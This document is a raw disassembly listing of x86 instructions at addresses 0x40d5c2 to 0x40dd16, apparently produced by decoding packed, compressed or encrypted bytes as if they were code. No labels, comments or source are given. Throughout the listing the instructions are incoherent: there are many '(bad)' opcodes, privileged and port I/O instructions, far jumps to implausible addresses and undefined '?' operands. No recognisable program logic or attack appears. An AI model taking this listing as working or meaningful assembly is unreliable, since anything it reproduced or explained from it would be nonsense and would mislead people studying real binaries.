  40d5c2:	rol    BYTE PTR [ecx+eiz*1-0x39],1
  40d5c6:	clc    
  40d5c7:	dec    eax
  40d5c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5c9:	mov    ecx,0xc37f66f0
  40d5ce:	pop    eax
  40d5cf:	adc    edx,eax
  40d5d1:	and    DWORD PTR [edi+0x4b],eax
  40d5d4:	outs   dx,BYTE PTR ds:[esi]
  40d5d5:	cdq    
  40d5d6:	(bad)  
  40d5d8:	dec    edi
  40d5d9:	out    0x2,eax
  40d5db:	outs   dx,BYTE PTR ds:[esi]
  40d5dc:	adc    ebp,esp
  40d5de:	aaa    
  40d5df:	fsub   DWORD PTR [edx-0x1d]
  40d5e2:	push   0x567abc32
  40d5e7:	test   al,0xf1
  40d5e9:	lds    edi,FWORD PTR [eax]
  40d5eb:	adc    al,0x11
  40d5ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5ee:	out    0x98,eax
  40d5f0:	mov    ds:0x664e7dee,eax
  40d5f5:	lods   eax,DWORD PTR ds:[esi]
  40d5f6:	xchg   BYTE PTR ds:0xf6f81897,dh
  40d5fc:	sub    BYTE PTR [ebp+0x2d],dl
  40d5ff:	jecxz  0x40d59d
  40d601:	icebp  
  40d602:	sub    ch,bh
  40d604:	or     eax,0xb744b15
  40d609:	dec    ebx
  40d60a:	cmp    BYTE PTR [ecx-0x16],cl
  40d60d:	fabs   
  40d60f:	jg     0x40d5d5
  40d611:	xor    ebp,ebx
  40d613:	shl    dh,cl
  40d615:	(bad)  
  40d616:	retf   
  40d617:	outs   dx,BYTE PTR ds:[esi]
  40d618:	dec    eax
  40d619:	popf   
  40d61a:	(bad)  
  40d61c:	and    DWORD PTR [edi+eiz*1-0x452f8221],edi
  40d623:	mov    BYTE PTR [esi-0xa92da44],0xcd
  40d62a:	mov    ch,0x15
  40d62c:	lds    esi,FWORD PTR [edi-0x4a0e0c13]
  40d632:	outs   dx,BYTE PTR ds:[esi]
  40d633:	sbb    esp,DWORD PTR [eax]
  40d635:	lock sub cl,ah
  40d638:	cmove  ebp,DWORD PTR [ebx]
  40d63b:	dec    edi
  40d63c:	retf   
  40d63d:	jbe    0x40d6a2
  40d63f:	jmp    0x3e088749
  40d644:	popf   
  40d645:	xchg   DWORD PTR [eax],esp
  40d647:	sbb    DWORD PTR [ebx],0x18ef252a
  40d64d:	hlt    
  40d64e:	jno    0x40d5ea
  40d650:	adc    eax,0xd5d6296b
  40d655:	mov    bl,0x4f
  40d657:	mov    ebp,0x97680d9d
  40d65c:	sbb    al,bl
  40d65e:	sahf   
  40d65f:	and    ebp,DWORD PTR [ecx-0x10]
  40d662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d663:	mov    esi,0x7f9000d8
  40d668:	push   es
  40d669:	sub    DWORD PTR fs:[ebx],0xffffffb8
  40d66d:	and    eax,0xb2ce6048
  40d672:	cmp    ch,al
  40d674:	hlt    
  40d675:	lock xor eax,DWORD PTR [ecx-0x6f]
  40d679:	stos   BYTE PTR es:[edi],al
  40d67a:	cmp    al,BYTE PTR [esi]
  40d67c:	jae    0x40d65f
  40d67e:	or     edi,DWORD PTR [ebx-0x34cd78de]
  40d684:	jnp    0x40d63a
  40d686:	jne    0x40d685
  40d688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d689:	imul   eax,DWORD PTR [edx+0x17870b72],0xb3d97331
  40d693:	(bad)
  40d697:	loop   0x40d70a
  40d699:	fsubr  DWORD PTR [ecx]
  40d69b:	cmc    
  40d69c:	les    ebx,FWORD PTR [eax-0x47e70aa0]
  40d6a2:	fist   DWORD PTR [edi-0x71]
  40d6a5:	cmp    DWORD PTR [eax+0x5fcce87f],ebx
  40d6ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6ac:	retf   
  40d6ad:	mov    ds:0x582bc1a6,eax
  40d6b2:	adc    bl,BYTE PTR [edi]
  40d6b4:	gs mov eax,0x6149554d
  40d6ba:	arpl   sp,di
  40d6bc:	inc    edx
  40d6bd:	inc    ebp
  40d6be:	cmp    BYTE PTR [ecx],0x70
  40d6c1:	data16 xor dl,BYTE PTR ss:[edx+0x1e]
  40d6c6:	push   0xffffffbb
  40d6c8:	cs cmp al,0xa4
  40d6cb:	cmp    ah,al
  40d6cd:	sub    ch,BYTE PTR [ebx]
  40d6cf:	cmp    edx,ebp
  40d6d1:	adc    DWORD PTR [esi-0x3ea698db],ecx
  40d6d7:	fcomp  DWORD PTR [ebx*2-0x51856898]
  40d6de:	int    0x34
  40d6e0:	shr    DWORD PTR [eax+0x604e21c9],0x6
  40d6e7:	js     0x40d731
  40d6e9:	ret    0xc7c0
  40d6ec:	jnp    0x40d678
  40d6ee:	mov    bh,0xb4
  40d6f0:	cs aas 
  40d6f2:	aam    0x6b
  40d6f4:	int    0xd3
  40d6f6:	hlt    
  40d6f7:	jmp    0x40d74e
  40d6f9:	mov    edx,0x7b68f8d
  40d6fe:	mov    ecx,0x19685d52
  40d703:	fdiv   DWORD PTR [edx+0x3f6bd585]
  40d709:	mov    al,ds:0x9a3bc85b
  40d70e:	into   
  40d70f:	sbb    dh,bh
  40d711:	scas   eax,DWORD PTR es:[edi]
  40d712:	hlt    
  40d713:	push   ebx
  40d714:	or     al,bl
  40d716:	sbb    DWORD PTR [esi-0x2c8e1aaa],ecx
  40d71c:	or     dl,cl
  40d71e:	psllq  mm5,QWORD PTR [edi+esi*2]
  40d722:	and    eax,0xaa8a1d31
  40d727:	cld    
  40d728:	lock inc edx
  40d72a:	sbb    al,BYTE PTR [edx-0x3e]
  40d72d:	cmp    ebx,DWORD PTR [esi]
  40d72f:	jns    0x40d78e
  40d731:	xchg   BYTE PTR ds:0xa4b225a,bl
  40d737:	sub    eax,0x55c92556
  40d73c:	data16 adc BYTE PTR [ebx+ebx*2-0x69],bl
  40d741:	sbb    BYTE PTR [ecx+0x49],ah
  40d744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d745:	mov    ah,0xb4
  40d747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d748:	scas   al,BYTE PTR es:[edi]
  40d749:	jmp    0x40d779
  40d74b:	or     BYTE PTR [edi+0x35],0x58
  40d74f:	jae    0x40d6d8
  40d751:	xor    al,0x92
  40d753:	(bad)  
  40d754:	enter  0x2f7e,0xb3
  40d758:	cdq    
  40d759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d75a:	(bad)  
  40d75b:	pop    ebp
  40d75c:	outs   dx,DWORD PTR ds:[esi]
  40d75d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d75e:	cli    
  40d75f:	jns    0x40d726
  40d761:	cmc    
  40d762:	rcl    DWORD PTR [eax],0x12
  40d765:	mov    al,0x59
  40d767:	scas   eax,DWORD PTR es:[edi]
  40d768:	test   ch,dl
  40d76a:	cs or  eax,0xf7c964c0
  40d770:	adc    ecx,DWORD PTR [esi]
  40d772:	jno    0x40d728
  40d774:	xor    BYTE PTR [ebx-0x46],bl
  40d777:	clc    
  40d778:	adc    cl,BYTE PTR [eax+esi*8+0x17]
  40d77c:	cwde   
  40d77d:	adc    BYTE PTR [esi+0x18],ch
  40d780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d781:	int    0x57
  40d783:	loop   0x40d7b4
  40d785:	(bad)  
  40d786:	xchg   ecx,eax
  40d787:	(bad)  
  40d788:	xor    DWORD PTR [ebx],eax
  40d78a:	or     eax,eax
  40d78c:	imul   cl
  40d78e:	or     DWORD PTR [eax+edx*8],eax
  40d791:	add    eax,0xad60bb06
  40d796:	aas    
  40d797:	imul   ecx,DWORD PTR [ecx-0x5c7e46d1],0x5f
  40d79e:	push   ds
  40d79f:	cdq    
  40d7a0:	push   eax
  40d7a1:	mov    esp,0x61adf747
  40d7a6:	movlhps xmm0,xmm2
  40d7a9:	lea    eax,[eax]
  40d7ab:	out    0x54,eax
  40d7ad:	ret    
  40d7ae:	mov    al,ds:0x12082950
  40d7b3:	inc    edx
  40d7b4:	jae    0x40d80f
  40d7b6:	dec    ecx
  40d7b7:	xchg   DWORD PTR [ebp+0x17],ebp
  40d7ba:	imul   ecx,eax,0x16fe9099
  40d7c0:	xor    al,0x4b
  40d7c2:	maskmovq mm6,mm5
  40d7c5:	or     ah,BYTE PTR [ebp-0x21]
  40d7c8:	loop   0x40d781
  40d7ca:	mov    al,0xb0
  40d7cc:	rcr    DWORD PTR [eax+0x15a4f3f4],0x9d
  40d7d3:	mov    edi,0x6012f12a
  40d7d8:	call   0x8576:0x82c0a074
  40d7df:	push   esi
  40d7e0:	dec    ecx
  40d7e1:	mov    esi,0xf7db367e
  40d7e6:	out    0x49,al
  40d7e8:	test   DWORD PTR [ebp-0x4d2284a7],0x289f66fa
  40d7f2:	fs iret 
  40d7f4:	les    edi,FWORD PTR [edi-0xa]
  40d7f7:	iret   
  40d7f8:	out    dx,eax
  40d7f9:	sub    al,0x59
  40d7fb:	cli    
  40d7fc:	sbb    DWORD PTR [edi],0x68c61e41
  40d802:	push   0xffffff86
  40d804:	push   edi
  40d805:	or     DWORD PTR [ebx],0x32
  40d808:	pushf  
  40d809:	cli    
  40d80a:	sub    eax,0xa0e86e82
  40d80f:	gs repz xchg ecx,eax
  40d812:	frstor [eax-0x32]
  40d815:	xchg   ebp,eax
  40d816:	adc    esi,esi
  40d818:	stos   DWORD PTR es:[edi],eax
  40d819:	dec    esp
  40d81a:	frstor [eax+0x74d3f290]
  40d820:	mov    bl,0x9f
  40d822:	fsub   QWORD PTR [edx-0x3263b42e]
  40d828:	fwait
  40d829:	neg    BYTE PTR [ebx]
  40d82b:	or     eax,0xbad20622
  40d830:	test   al,0xa0
  40d832:	clc    
  40d833:	cmp    eax,0x73bb8011
  40d838:	icebp  
  40d839:	(bad)  
  40d83a:	push   edi
  40d83b:	pop    ds
  40d83c:	stos   DWORD PTR es:[edi],eax
  40d83d:	stos   DWORD PTR es:[edi],eax
  40d83e:	fdiv   DWORD PTR [ebx+0xc71bdcb]
  40d844:	add    BYTE PTR [esi-0x3c93919f],bh
  40d84a:	xchg   ebp,eax
  40d84b:	test   ch,ch
  40d84d:	scas   eax,DWORD PTR es:[edi]
  40d84e:	cmp    al,0x86
  40d850:	dec    eax
  40d851:	push   cs
  40d852:	or     edx,DWORD PTR [edi]
  40d854:	jmp    0x40d8af
  40d856:	mov    ebx,0xe65cc473
  40d85b:	mov    es,edx
  40d85d:	out    dx,al
  40d85e:	int3   
  40d85f:	mov    esp,0x8544e247
  40d864:	jbe    0x40d8e4
  40d866:	mov    db6,esp
  40d869:	pushf  
  40d86a:	ret    
  40d86b:	pop    edx
  40d86c:	jecxz  0x40d881
  40d86e:	add    BYTE PTR [ecx-0x4e904c5d],ah
  40d874:	inc    ecx
  40d875:	xor    BYTE PTR [esi-0x7c],ch
  40d878:	sbb    al,0x4c
  40d87a:	inc    ebx
  40d87b:	dec    ch
  40d87d:	sub    BYTE PTR [ecx+0x12f6b210],cl
  40d883:	sub    BYTE PTR [eax],dl
  40d885:	in     al,0xff
  40d887:	(bad)  
  40d888:	call   DWORD PTR [esi-0x70]
  40d88b:	ss popa 
  40d88d:	repz xlat BYTE PTR fs:[ebx]
  40d890:	lock aad 0xad
  40d893:	lods   eax,DWORD PTR ds:[esi]
  40d894:	mov    eax,0x2a7e9ce7
  40d899:	bound  edx,QWORD PTR [ebp+0xe]
  40d89c:	xchg   esi,eax
  40d89d:	push   eax
  40d89e:	add    edx,DWORD PTR [esi+0x45]
  40d8a1:	cli    
  40d8a2:	or     al,0x73
  40d8a4:	jp     0x40d8f9
  40d8a6:	test   DWORD PTR [ecx+0x31],edi
  40d8a9:	mov    BYTE PTR [esi],bl
  40d8ab:	pushf  
  40d8ac:	imul   esi
  40d8ae:	and    BYTE PTR [edx+edi*1-0x3757f470],dl
  40d8b5:	iret   
  40d8b6:	inc    ebx
  40d8b7:	cmc    
  40d8b8:	jmp    0x40d87f
  40d8ba:	popa   
  40d8bb:	sbb    al,0x55
  40d8bd:	mov    WORD PTR [esi-0x39],?
  40d8c0:	daa    
  40d8c1:	jecxz  0x40d8fc
  40d8c3:	pop    edi
  40d8c4:	retf   0xcaa4
  40d8c7:	xchg   edi,eax
  40d8c8:	xchg   ecx,eax
  40d8c9:	scas   eax,DWORD PTR es:[edi]
  40d8ca:	xchg   edi,eax
  40d8cb:	sti    
  40d8cc:	repz fidivr DWORD PTR [esi]
  40d8cf:	and    al,0x28
  40d8d1:	pop    ebx
  40d8d2:	xor    dl,bh
  40d8d4:	lock sub ebp,eax
  40d8d7:	leave  
  40d8d8:	cdq    
  40d8d9:	or     DWORD PTR [ecx],edi
  40d8db:	(bad)  
  40d8dc:	out    0x85,al
  40d8de:	lea    eax,[eax]
  40d8e0:	js     0x40d91b
  40d8e2:	scas   al,BYTE PTR es:[edi]
  40d8e3:	and    DWORD PTR [ecx-0x4e],esi
  40d8e6:	outs   dx,DWORD PTR ds:[esi]
  40d8e7:	bound  esp,QWORD PTR [edi]
  40d8e9:	in     eax,dx
  40d8ea:	mov    cs,WORD PTR [edx]
  40d8ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8ed:	mov    edi,DWORD PTR [ebx]
  40d8ef:	lods   al,BYTE PTR ds:[esi]
  40d8f0:	addr16 mov cl,0xdb
  40d8f3:	jmp    FWORD PTR [esi-0x3d]
  40d8f6:	test   edx,ebx
  40d8f8:	xchg   BYTE PTR [ecx+0x67d64e30],dh
  40d8fe:	push   ecx
  40d8ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d900:	xchg   ecx,eax
  40d901:	test   BYTE PTR [edi+0x70],ch
  40d904:	jge    0x40d8ac
  40d906:	iret   
  40d907:	xchg   edi,eax
  40d908:	dec    esp
  40d909:	xchg   ecx,eax
  40d90a:	(bad)  
  40d90b:	pop    eax
  40d90c:	repnz fbld TBYTE PTR [edi-0x5d442ab2]
  40d913:	xchg   DWORD PTR [esi-0x1],eax
  40d916:	or     DWORD PTR [esi-0x27],0x33
  40d91a:	lods   al,BYTE PTR ds:[esi]
  40d91b:	repz push ecx
  40d91d:	mov    bl,0xa
  40d91f:	mov    esi,0xe2b79af3
  40d924:	(bad)  
  40d925:	into   
  40d926:	pop    ebp
  40d927:	test   BYTE PTR [edx-0x39],al
  40d92a:	sbb    ah,BYTE PTR [edi+0x53b8ec2c]
  40d930:	lods   eax,DWORD PTR ds:[esi]
  40d931:	cmp    al,0x4a
  40d933:	ficom  WORD PTR [esi]
  40d935:	into   
  40d936:	pop    esi
  40d937:	push   es
  40d938:	mov    ebp,0xb15451ba
  40d93d:	loope  0x40d9b4
  40d93f:	inc    ebp
  40d940:	das    
  40d941:	rcr    DWORD PTR [eax-0x75],0xe2
  40d945:	imul   esp,DWORD PTR [edx-0x34],0xfffffffa
  40d949:	adc    eax,DWORD PTR [edi-0x63bb81f9]
  40d94f:	xchg   DWORD PTR [eax+0x64],edx
  40d952:	and    esi,DWORD PTR [edi+0x469850ea]
  40d958:	stos   BYTE PTR es:[edi],al
  40d959:	inc    ecx
  40d95a:	arpl   WORD PTR [ebp+esi*8+0x11c64ebd],si
  40d961:	in     eax,0xca
  40d963:	cmc    
  40d964:	arpl   WORD PTR ss:[ebp+0x1a],ax
  40d968:	out    0x25,eax
  40d96a:	mov    edi,0x19c2da2a
  40d96f:	arpl   dx,bp
  40d971:	clc    
  40d972:	lods   al,BYTE PTR ds:[esi]
  40d973:	add    DWORD PTR [esp+eax*2],esp
  40d976:	sub    BYTE PTR [eax],ch
  40d978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d979:	and    al,0x3c
  40d97b:	gs xchg ebp,eax
  40d97d:	push   edx
  40d97e:	push   eax
  40d97f:	hlt    
  40d980:	loope  0x40d958
  40d982:	stos   BYTE PTR es:[edi],al
  40d983:	xor    BYTE PTR [ebx+0x6e473a6d],cl
  40d989:	mov    al,0x30
  40d98b:	cmp    DWORD PTR [edx-0x6b3e80e5],edi
  40d991:	cmc    
  40d992:	push   esp
  40d993:	scas   al,BYTE PTR es:[edi]
  40d994:	dec    esi
  40d995:	fisubr WORD PTR [ecx+0x6ca0ef8f]
  40d99b:	mov    al,ds:0x29341b62
  40d9a0:	out    dx,al
  40d9a1:	out    dx,al
  40d9a2:	fbld   TBYTE PTR [eax+0x343835a]
  40d9a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9a9:	out    0x35,eax
  40d9ab:	cdq    
  40d9ac:	jge    0x40d9ca
  40d9ae:	imul   ebx,DWORD PTR [ecx+0x1e],0xffffffff
  40d9b2:	push   0x85edad4e
  40d9b7:	mov    ebp,DWORD PTR [ebp+0x72]
  40d9ba:	sub    al,0x86
  40d9bc:	add    al,0xcf
  40d9be:	jle    0x40da37
  40d9c0:	push   edx
  40d9c1:	mov    ds:0xf5eda0b6,eax
  40d9c6:	sub    DWORD PTR [ecx],ebx
  40d9c8:	and    BYTE PTR [edi-0x3],ch
  40d9cb:	cld    
  40d9cc:	iret   
  40d9cd:	pop    eax
  40d9ce:	dec    edx
  40d9cf:	pop    ebx
  40d9d0:	(bad)  
  40d9d1:	adc    BYTE PTR [eax-0x5e1add53],bl
  40d9d7:	add    DWORD PTR [bx+si+0xb9],ecx
  40d9dc:	xchg   ecx,eax
  40d9dd:	jg     0x40d9f2
  40d9df:	push   ecx
  40d9e0:	outs   dx,DWORD PTR ds:[esi]
  40d9e1:	lods   al,BYTE PTR ds:[esi]
  40d9e2:	in     al,dx
  40d9e3:	and    eax,DWORD PTR [edi+0x482939f2]
  40d9e9:	jb     0x40d972
  40d9eb:	mov    dh,0x44
  40d9ed:	loopne 0x40da2f
  40d9ef:	leave  
  40d9f0:	mov    esp,0x44992556
  40d9f5:	push   edx
  40d9f6:	lea    ebx,[ecx+0x2c]
  40d9f9:	xlat   BYTE PTR ds:[ebx]
  40d9fa:	ds in  al,dx
  40d9fc:	shr    dl,0x85
  40d9ff:	ins    DWORD PTR es:[edi],dx
  40da00:	ins    BYTE PTR es:[edi],dx
  40da01:	xchg   edx,eax
  40da02:	jno    0x40da3f
  40da04:	and    al,0x57
  40da06:	mov    ah,0x51
  40da08:	jge    0x40da2e
  40da0a:	push   edx
  40da0b:	pusha  
  40da0c:	mov    dl,0x56
  40da0e:	jns    0x40d995
  40da10:	cs jmp 0x6b56964b
  40da16:	add    al,0xcc
  40da18:	cdq    
  40da19:	adc    DWORD PTR [edi],eax
  40da1b:	jb     0x40da3b
  40da1d:	inc    ecx
  40da1e:	sbb    BYTE PTR [eax+0x73],dl
  40da21:	dec    edi
  40da22:	xor    ecx,DWORD PTR fs:[ecx-0x4b953d79]
  40da29:	jle    0x40d9f9
  40da2b:	imul   ecx,DWORD PTR [eax],0xffffff93
  40da2e:	mov    ah,0x32
  40da30:	shr    DWORD PTR [esi+0x3ab9a0ba],cl
  40da36:	fdivr  QWORD PTR [eax-0x5a6ab449]
  40da3c:	jg     0x40da5c
  40da3e:	test   eax,0xb0c91a44
  40da43:	add    eax,ebx
  40da45:	das    
  40da46:	sub    bh,BYTE PTR [edx-0x1d660a12]
  40da4c:	in     eax,dx
  40da4d:	and    ah,BYTE PTR [edx-0x3ae2e5db]
  40da53:	ins    BYTE PTR es:[edi],dx
  40da54:	jmp    0x2c110ae6
  40da59:	cmp    edi,0x2f
  40da5c:	shl    DWORD PTR [esi+0x53],1
  40da5f:	std    
  40da60:	fwait
  40da61:	sahf   
  40da62:	fwait
  40da63:	sbb    dh,ch
  40da65:	fucomp st(1)
  40da67:	dec    esi
  40da68:	retf   0x7ca6
  40da6b:	cdq    
  40da6c:	mov    ss,WORD PTR [esi-0x23a55ce1]
  40da72:	hlt    
  40da73:	dec    edx
  40da74:	je     0x40da95
  40da76:	in     eax,0xfe
  40da78:	push   eax
  40da79:	rcl    eax,1
  40da7b:	xchg   ebx,eax
  40da7c:	or     ebx,DWORD PTR [edi]
  40da7e:	out    dx,al
  40da7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da80:	ret    
  40da81:	or     eax,0xf024397a
  40da86:	mov    eax,0x9de91fe9
  40da8b:	jecxz  0x40dadf
  40da8d:	cmp    al,0xda
  40da8f:	or     edi,DWORD PTR [edx-0x50a10ae0]
  40da95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da96:	cmovge ecx,DWORD PTR [edi]
  40da99:	mov    ds:0xcc6e1725,eax
  40da9e:	in     eax,0x7a
  40daa0:	jnp    0x40daf6
  40daa2:	or     eax,0xc5b38f68
  40daa7:	dec    edi
  40daa8:	outs   dx,DWORD PTR ds:[esi]
  40daa9:	or     esp,esi
  40daab:	mov    al,0x6c
  40daad:	mov    cl,cl
  40daaf:	ret    
  40dab0:	add    DWORD PTR [ecx-0x40329a7c],ebp
  40dab6:	jmp    0x74b1607a
  40dabb:	loope  0x40db0f
  40dabd:	dec    ecx
  40dabe:	call   0xedfd5e8a
  40dac3:	mov    ds:0xa559757c,eax
  40dac8:	inc    edx
  40dac9:	stc    
  40daca:	sub    bh,BYTE PTR [eiz*2-0x555ba030]
  40dad1:	sbb    eax,0xfe27ae95
  40dad6:	mov    bl,0xc7
  40dad8:	and    eax,0x7a59e6a3
  40dadd:	std    
  40dade:	pop    eax
  40dadf:	xchg   DWORD PTR [eax],ebp
  40dae1:	cmp    esi,DWORD PTR [ebx+0x2a06fdb0]
  40dae7:	add    ebx,esp
  40dae9:	rcr    DWORD PTR [edi],0x83
  40daec:	bound  esi,QWORD PTR [edx+0x7c]
  40daef:	mov    esp,0x8a12ac9a
  40daf4:	cmp    eax,0xeaa2e67d
  40daf9:	loop   0x40dabd
  40dafb:	xor    cl,BYTE PTR [edx+ecx*8+0x31]
  40daff:	shl    DWORD PTR [eax+0x4bed32d3],1
  40db05:	mov    ebx,0x2873992
  40db0a:	cmc    
  40db0b:	div    DWORD PTR [ebx+ebp*8-0x22]
  40db0f:	test   ebp,esp
  40db11:	or     BYTE PTR [esi-0x72722059],bh
  40db17:	xor    eax,DWORD PTR [ebx+esi*4-0x3a34d2fc]
  40db1e:	jmp    0x40dac9
  40db20:	ret    
  40db21:	push   ds
  40db22:	cdq    
  40db23:	lods   eax,DWORD PTR cs:[esi]
  40db25:	dec    ecx
  40db26:	push   esi
  40db27:	scas   al,BYTE PTR es:[edi]
  40db28:	out    0x8f,al
  40db2a:	iret   
  40db2b:	test   al,0xfc
  40db2d:	cvtps2pd xmm0,QWORD PTR [edi+0x218be0]
  40db34:	jno    0x40db5d
  40db36:	(bad)
  40db39:	pop    ss
  40db3a:	movhps QWORD PTR [edx],xmm4
  40db3d:	sti    
  40db3e:	xchg   BYTE PTR [edx],dh
  40db40:	retf   0x6251
  40db43:	cmp    ah,BYTE PTR [edi+0x57]
  40db46:	mov    ah,0xbc
  40db48:	sub    eax,0x714ac394
  40db4d:	sar    cl,0x43
  40db50:	sub    edi,ebx
  40db52:	xor    al,0x30
  40db54:	push   ds
  40db55:	sub    DWORD PTR [eax+0x60],ebp
  40db58:	pop    ebp
  40db59:	cmp    DWORD PTR [ecx],ebx
  40db5b:	lock test DWORD PTR [esi+0x43],ebp
  40db5f:	scas   eax,DWORD PTR es:[edi]
  40db60:	adc    al,0x19
  40db62:	ret    0xa347
  40db65:	mov    esp,eax
  40db67:	dec    ebx
  40db68:	xor    al,0x7b
  40db6a:	xor    eax,0xc41a05cc
  40db6f:	fld    DWORD PTR [edx+0x72e5eb95]
  40db75:	cli    
  40db76:	pop    eax
  40db77:	out    dx,al
  40db78:	call   0x5c11:0x8387b9ad
  40db7f:	(bad)  
  40db80:	lock inc ebp
  40db82:	fdivr  st,st(1)
  40db84:	inc    DWORD PTR [eax+0x5a]
  40db87:	mov    dh,0x34
  40db89:	aaa    
  40db8a:	xchg   esi,eax
  40db8b:	cmp    al,0x6f
  40db8d:	rcr    BYTE PTR [esi-0x52ee4e01],0xcd
  40db94:	push   eax
  40db95:	fist   DWORD PTR [ecx]
  40db97:	repnz mov eax,0xe53bf1bc
  40db9d:	and    eax,DWORD PTR [ecx+0x4c998e54]
  40dba3:	add    al,BYTE PTR [esi]
  40dba5:	mov    eax,ds:0xf258d220
  40dbaa:	adc    edx,DWORD PTR [edx+esi*2-0x1a4b034b]
  40dbb1:	and    ch,BYTE PTR [edi+0x29825666]
  40dbb7:	inc    edi
  40dbb8:	ror    edi,0xc4
  40dbbb:	jge    0x93db36c7
  40dbc1:	pop    ebx
  40dbc2:	es jmp ebp
  40dbc5:	mov    ah,0x8d
  40dbc7:	mov    bl,BYTE PTR [esp+ebx*8]
  40dbca:	xchg   ah,cl
  40dbcc:	(bad)  
  40dbcd:	mov    ebp,0x32fea82e
  40dbd2:	sub    ch,BYTE PTR [ecx-0x12]
  40dbd5:	fsubr  st,st(3)
  40dbd7:	or     BYTE PTR [edx],bl
  40dbd9:	adc    BYTE PTR [eax-0x62136d4],0xb4
  40dbe0:	adc    al,cl
  40dbe2:	add    bh,BYTE PTR [ebx-0x2a]
  40dbe5:	(bad)  
  40dbe6:	in     al,0xdc
  40dbe8:	mul    BYTE PTR [edx-0x1f]
  40dbeb:	sub    eax,0x45b02516
  40dbf0:	clc    
  40dbf1:	xlat   BYTE PTR fs:[ebx]
  40dbf3:	ins    DWORD PTR es:[edi],dx
  40dbf4:	dec    ebx
  40dbf5:	cdq    
  40dbf6:	les    eax,FWORD PTR [edi-0x55]
  40dbf9:	push   edx
  40dbfa:	iret   
  40dbfb:	push   0xe0c056e5
  40dc00:	fistp  WORD PTR [ebx-0x1]
  40dc03:	sbb    DWORD PTR [ebx-0x7179b67e],ebx
  40dc09:	ficomp DWORD PTR [esi-0x4e7af0e1]
  40dc0f:	sbb    DWORD PTR [eax],edi
  40dc11:	adc    BYTE PTR [ecx-0xd313ed4],bl
  40dc17:	fsub   DWORD PTR [ebx+0x16]
  40dc1a:	inc    ebx
  40dc1b:	mov    edx,es
  40dc1d:	mov    esp,0xb8927f8b
  40dc22:	aas    
  40dc23:	add    BYTE PTR ds:0x6564bb9b,cl
  40dc29:	stos   DWORD PTR es:[edi],eax
  40dc2a:	jno    0x40dbb6
  40dc2c:	cmp    eax,ebx
  40dc2e:	inc    eax
  40dc2f:	shl    DWORD PTR ds:0xdc45cf8e,cl
  40dc35:	jge    0x40dc79
  40dc37:	sbb    cl,ch
  40dc39:	jmp    0x40dc47
  40dc3b:	mov    WORD PTR ds:0x38d609a9,ss
  40dc41:	lods   eax,DWORD PTR ds:[esi]
  40dc42:	xchg   bl,al
  40dc44:	popf   
  40dc45:	loope  0x40dcb2
  40dc47:	imul   esi,DWORD PTR [esi-0x2c5144ac],0x869396d0
  40dc51:	mov    ebp,0xcd93faf6
  40dc56:	out    0x3d,al
  40dc58:	std    
  40dc59:	repnz hlt 
  40dc5b:	inc    edi
  40dc5c:	pop    edi
  40dc5d:	sub    al,0xdb
  40dc5f:	jo     0x40dbf2
  40dc61:	cmp    eax,0x4e81545
  40dc66:	ss (bad) 
  40dc68:	mov    cl,0x49
  40dc6a:	sub    BYTE PTR [ebx],0xe8
  40dc6d:	jg     0x40dcb6
  40dc6f:	lock jmp 0x77dc6caf
  40dc75:	(bad)  
  40dc77:	fisttp WORD PTR [esi+0x2f]
  40dc7a:	mov    eax,ds:0x47858fba
  40dc7f:	mov    al,0xd3
  40dc81:	push   ss
  40dc82:	mov    ss,WORD PTR [edi]
  40dc84:	add    BYTE PTR [ebx],0xac
  40dc87:	aad    0xbf
  40dc89:	dec    ebx
  40dc8a:	imul   ebx,ebx,0xfb7585f1
  40dc90:	mov    ebx,esp
  40dc92:	add    ah,BYTE PTR [esi]
  40dc94:	or     al,0x1e
  40dc96:	cmp    al,0x71
  40dc98:	push   es
  40dc99:	mov    al,ds:0x23af344a
  40dc9e:	leave  
  40dc9f:	loopne 0x40dc50
  40dca1:	outs   dx,BYTE PTR ds:[esi]
  40dca2:	imul   esi,DWORD PTR [edx],0x4c1a4e31
  40dca8:	mov    al,ds:0x2006793
  40dcad:	jb     0x40dd00
  40dcaf:	and    eax,0xf6492774
  40dcb4:	sub    al,0x6f
  40dcb6:	jg     0x40dc8f
  40dcb8:	xchg   esi,eax
  40dcb9:	fadd   QWORD PTR [ecx-0x2f64145c]
  40dcbf:	fisttp WORD PTR [esi+0x47]
  40dcc2:	out    0xef,eax
  40dcc4:	cmp    edi,edx
  40dcc6:	pusha  
  40dcc7:	jmp    0x8b8:0xc1cd8f6f
  40dcce:	jnp    0x40dccf
  40dcd0:	sub    bh,BYTE PTR [eax]
  40dcd2:	sub    esp,DWORD PTR [edi-0x7903995f]
  40dcd8:	or     DWORD PTR [edi+ebx*2-0x1d7cf1f1],ebp
  40dcdf:	ins    DWORD PTR es:[edi],dx
  40dce0:	lods   eax,DWORD PTR ds:[esi]
  40dce1:	sub    BYTE PTR [edx+0x16bbd86f],bl
  40dce7:	mov    eax,0x9439aef3
  40dcec:	imul   ebp,DWORD PTR [ecx],0xcc5e5775
  40dcf2:	and    DWORD PTR [edi+0x1ea4a7d2],ebp
  40dcf8:	cmp    al,0xa3
  40dcfa:	and    ah,cl
  40dcfc:	outs   dx,DWORD PTR ds:[esi]
  40dcfd:	gs or  eax,0x2833dbaa
  40dd03:	mov    ?,WORD PTR [ecx+0x5b]
  40dd06:	and    BYTE PTR [esp+edi*2],0xca
  40dd0a:	es jmp 0x40dcd8
  40dd0d:	cli    
  40dd0e:	mov    dl,0xbb
  40dd10:	jne    0x40dd6e
  40dd12:	push   0xffffffda
  40dd14:	mov    cl,0xe4
  40dd16:	add    al,BYTE PTR [ebp+edx*8+0x2d27f452]
